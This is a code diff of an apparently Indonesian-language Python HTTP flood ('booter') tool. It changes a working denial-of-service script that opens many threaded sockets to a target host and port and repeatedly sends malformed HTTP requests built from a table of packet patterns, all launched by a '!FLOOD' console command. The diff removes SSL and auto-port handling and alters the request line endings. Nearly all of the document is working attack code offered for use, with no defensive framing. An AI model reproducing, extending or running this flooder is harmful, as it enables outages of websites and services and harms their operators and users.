@@ -7,7 +7,6 @@ try:
     import os
     import platform
     import sys
-    import ssl
     from colorama import Fore
 except ModuleNotFoundError as e:
     print(f"{e} CAN'T IMPORT . . . . ")
@@ -25,7 +24,7 @@ def generate_url_path_pyflooder(num):
     msg = string.ascii_letters + string.digits + string.punctuation
     data = "".join(random.sample(msg, int(num)))
     return data
-
+    
 def generate_url_path_choice(num):
     letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
     data = ""
@@ -33,16 +32,7 @@ def generate_url_path_choice(num):
         data += random.choice(letter)
     return data
 
-def create_socket(ip, port, use_ssl=False):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(5)
-    if use_ssl:
-        context = ssl.create_default_context()
-        s = context.wrap_socket(s, server_hostname=ip)
-    s.connect((ip, port))
-    return s
-
-def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet, use_ssl):
+def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet):
     if stop_attack.is_set():
         return
     
@@ -55,46 +45,49 @@ def DoS_Attack(ip, host, port, type_attack, booter_sent, data_type_loader_packet
         url_path = generate_url_path_choice(5)
 
     payload_patterns = {
-        'PY': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
-        'OWN1': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n",
-        'OWN2': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n",
-        'OWN3': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
-        'OWN4': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n\r\n",
-        'OWN5': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n\r\n\r\n",
-        'OWN6': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n",
-        'OWN7': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
-        'TEST': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n",
-        'TEST2': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n",
-        'TEST3': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n",
-        'TEST4': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n\r\n\r\n",
-        'TEST5': f"{type_attack} /{url_path} HTTP/1.1\r\nHost: {host}\r\n\r\n",
+        'PY': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n",
+        'OWN1': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r",
+        'OWN2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n",
+        'OWN3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n",
+        'OWN4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n",
+        'OWN5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r",
+        'OWN6': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n",
+        'OWN7': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r",
+        'OWN8': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r",
+        'TEST': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n",
+        'TEST2': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n",
+        'TEST3': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n",
+        'TEST4': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r",
+        'TEST5': f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r",
     }
     
     packet_str = payload_patterns.get(data_type_loader_packet, payload_patterns['PY'])
     packet_data = packet_str.encode()
 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
-        s = create_socket(ip, port, use_ssl)
+        s.settimeout(3)
+        s.connect((ip, port))
         for _ in range(booter_sent):
             if stop_attack.is_set():
                 break
             s.sendall(packet_data)
             s.send(packet_data)
-    except Exception:
-        pass
-    finally:
+    except:
         try:
             s.shutdown(socket.SHUT_RDWR)
             s.close()
         except:
             pass
+    finally:
+        s.close()
 
-def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl):
+def runing_attack(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet):
     while time.time() < time_loader and not stop_attack.is_set():
         for _ in range(min(spam_loader, 10)):  # Limit spam thread count per iteration
             if stop_attack.is_set():
                 break
-            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl))
+            th = threading.Thread(target=DoS_Attack, args=(ip, host, port_loader, methods_loader, booter_sent, data_type_loader_packet))
             th.start()
             th.join()
 
@@ -141,34 +134,16 @@ def command():
             if args_get[0].lower() == "clear":
                 clear_text()
             elif args_get[0].upper() == "!FLOOD":
-                if len(args_get) == 11:
+                if len(args_get) == 10:
                     data_type_loader_packet = args_get[1].upper()
                     target_loader = args_get[2]
-                    port_loader = args_get[3]
-                    time_attack = int(args_get[4])
+                    port_loader = int(args_get[3])
+                    time_loader = time.time() + int(args_get[4])
                     spam_loader = int(args_get[5])
                     create_thread = min(int(args_get[6]), 10)  # Limit threads
                     booter_sent = int(args_get[7])
                     methods_loader = args_get[8]
                     spam_create_thread = min(int(args_get[9]), 10)  # Limit threads
-                    protocol = args_get[10].lower()
-
-                    # Determine port and SSL usage if port is 0 or auto
-                    use_ssl = False
-                    try:
-                        if port_loader.lower() == "auto" or port_loader == "0":
-                            if protocol == "https":
-                                port_loader = 443
-                                use_ssl = True
-                            else:
-                                port_loader = 80
-                        else:
-                            port_loader = int(port_loader)
-                            if port_loader == 443 or protocol == "https":
-                                use_ssl = True
-                    except Exception as e:
-                        print(f"{Fore.RED}Port must be integer or 'auto'{Fore.RESET}")
-                        continue
 
                     code_leak = True
                     host = ''
@@ -187,13 +162,12 @@ def command():
 
                     if code_leak:
                         stop_attack.clear()  # Reset stop flag
-                        time_loader = time.time() + time_attack
-                        print(f"{Fore.LIGHTCYAN_EX}Serangan diMulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nProtocol: {'HTTPS' if use_ssl else 'HTTP'}\nType: {data_type_loader_packet}\n{Fore.RESET}")
+                        print(f"{Fore.LIGHTCYAN_EX}Serangan diMulai\n{Fore.YELLOW}Target: {target_loader}\nPort: {port_loader}\nType: {data_type_loader_packet}\n{Fore.RESET}")
 
                         # Start attack threads
                         for _ in range(create_thread):
                             for _ in range(spam_create_thread):
-                                th = threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet, use_ssl))
+                                th = threading.Thread(target=runing_attack, args=(ip, host, port_loader, time_loader, spam_loader, methods_loader, booter_sent, data_type_loader_packet))
                                 th.daemon = True
                                 th.start()
 
@@ -215,8 +189,8 @@ def command():
                         print()  # newline for prompt
                         continue
                 else:
-                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT/auto> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE> <PROTOCOL>{Fore.RESET}")
-                    print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 TEST3 TEST4 TEST5 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15)\n {Fore.WHITE}[+] {Fore.MAGENTA}PROTOCOL (http or https){Fore.RESET}")
+                    print(f"{Fore.RED}!FLOOD <TYPE_PACKET> <TARGET> <PORT> <TIME> {Fore.LIGHTRED_EX}<SPAM_THREAD> <CREATE_THREAD> <BOOTER_SENT> {Fore.WHITE}<HTTP_METHODS> <SPAM_CREATE>{Fore.RESET}")
+                    print(f"{Fore.CYAN}TYPE_PACKET --> {Fore.WHITE}[ {Fore.LIGHTBLUE_EX}PYF {Fore.WHITE}| TEST TEST2 TEST3 TEST4 TEST5 {Fore.WHITE}| {Fore.BLUE}OWN1 OWN2 OWN3 OWN4 OWN5 OWN6 OWN7 {Fore.WHITE}]\n {Fore.WHITE}[+] {Fore.LIGHTCYAN_EX}TIME (EXAMPLE=250)\n {Fore.WHITE}[+] {Fore.GREEN}SPAM_THREAD (EXAMPLE=299)\n {Fore.WHITE}[+] {Fore.LIGHTGREEN_EX}CREATE_THREAD (EXAMPLE=5)\n {Fore.WHITE}[+] {Fore.LIGHTYELLOW_EX}HTTP_METHODS (EXAMPLE=GATEWAY)\n {Fore.WHITE}[+] {Fore.YELLOW}SPAM_CREATE (EXAMPLE=15){Fore.RESET}")
             else:
                 print(f"{Fore.WHITE}[{Fore.YELLOW}+{Fore.WHITE}] {Fore.RED}{data_input_loader} {Fore.LIGHTRED_EX}Not found command{Fore.RESET}")
         except KeyboardInterrupt:
